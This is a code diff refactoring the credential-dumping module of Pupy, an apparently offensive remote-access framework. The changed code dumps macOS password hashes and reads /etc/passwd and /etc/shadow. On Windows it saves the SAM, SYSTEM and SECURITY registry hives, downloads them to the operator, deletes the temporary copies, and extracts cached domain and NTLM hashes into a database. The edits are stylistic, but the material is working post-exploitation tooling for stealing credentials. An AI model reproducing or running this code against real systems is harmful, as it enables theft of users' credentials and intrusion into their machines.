@@ -61,8 +61,7 @@ class CredDump(PupyModule):
 
     def darwin(self):
         self.client.load_package("hashdump")
-        hashes = self.client.conn.modules["hashdump"].hashdump()
-        if hashes:
+        if hashes := self.client.conn.modules["hashdump"].hashdump():
             self.db.add([{
                 'Hash':hsh[1],
                 'Login': hsh[0],
@@ -71,7 +70,7 @@ class CredDump(PupyModule):
             } for hsh in hashes])
 
             for hsh in hashes:
-                self.log('{}'.format(hsh))
+                self.log(f'{hsh}')
 
             self.success("Hashes stored on the database")
         else:
@@ -96,7 +95,7 @@ class CredDump(PupyModule):
             )
 
             with open(passwd, 'r') as fpasswd:
-                for line in fpasswd.readlines():
+                for line in fpasswd:
                     add_hashes(line)
 
         except Exception as e:
@@ -111,7 +110,7 @@ class CredDump(PupyModule):
             )
 
             with open(shadow, 'r') as fshadow:
-                for line in fshadow.readlines():
+                for line in fshadow:
                     add_hashes(line)
 
         except Exception as e:
@@ -172,10 +171,10 @@ class CredDump(PupyModule):
         self.success("saving SYSTEM hives in %TEMP%...")
         cmds = ("reg save HKLM\\SYSTEM %TEMP%/SYSTEM", "reg save HKLM\\SECURITY %TEMP%/SECURITY", "reg save HKLM\\SAM %TEMP%/SAM")
         if is_vista:
-            cmds = (x+' /y' for x in cmds)
+            cmds = (f'{x} /y' for x in cmds)
 
         for cmd in cmds:
-            self.info("running %s..." % cmd)
+            self.info(f"running {cmd}...")
             self.log(shell_exec(self.client, cmd))
 
         self.success("hives saved!")
@@ -190,7 +189,7 @@ class CredDump(PupyModule):
         self.info("downloading SAM hive...")
         download(self.client.conn, ntpath.join(remote_temp, "SAM"), os.path.join(self.rep, "SAM"))
 
-        self.success("hives downloaded to %s" % self.rep)
+        self.success(f"hives downloaded to {self.rep}")
 
         # Cleanup
         self.success("cleaning up saves...")
@@ -200,7 +199,7 @@ class CredDump(PupyModule):
             self.client.conn.modules.os.remove(ntpath.join(remote_temp, "SAM"))
             self.success("saves deleted")
         except Exception as e:
-            self.warning("error deleting temporary files: %s"%str(e))
+            self.warning(f"error deleting temporary files: {str(e)}")
 
         # Time to run creddump!
         hashes = []
@@ -214,14 +213,15 @@ class CredDump(PupyModule):
         self.success("dumping cached domain passwords...")
 
         for (u, d, dn, h) in dump_hashes(sysaddr, secaddr, is_vista):
-            self.log("%s:%s:%s:%s" % (u.lower(), h.encode('hex'),
-                d.lower(), dn.lower()))
-            hashes.append({
-                'Login': u.lower(),
-                'Hash': "%s:%s:%s" % (h.encode('hex'), d.lower(), dn.lower()),
-                'Category': 'MSCACHE hash',
-                'CredType': 'hash'
-            })
+            self.log(f"{u.lower()}:{h.encode('hex')}:{d.lower()}:{dn.lower()}")
+            hashes.append(
+                {
+                    'Login': u.lower(),
+                    'Hash': f"{h.encode('hex')}:{d.lower()}:{dn.lower()}",
+                    'Category': 'MSCACHE hash',
+                    'CredType': 'hash',
+                }
+            )
 
         self.success("dumping LM and NT hashes...")
         bootkey = get_bootkey(sysaddr)
@@ -235,12 +235,14 @@ class CredDump(PupyModule):
                 nthash = empty_nt
 
             self.log("%s:%d:%s:%s:::" % (get_user_name(user), int(user.Name, 16), lmhash.encode('hex'), nthash.encode('hex')))
-            hashes.append({
-                'Login': get_user_name(user),
-                'Hash': "%s:%s" % (lmhash.encode('hex'), nthash.encode('hex')),
-                'Category': 'NTLM hash',
-                'CredType': 'hash'
-            })
+            hashes.append(
+                {
+                    'Login': get_user_name(user),
+                    'Hash': f"{lmhash.encode('hex')}:{nthash.encode('hex')}",
+                    'Category': 'NTLM hash',
+                    'CredType': 'hash',
+                }
+            )
 
         self.db.add(hashes)
         self.success("Hashes stored on the database")
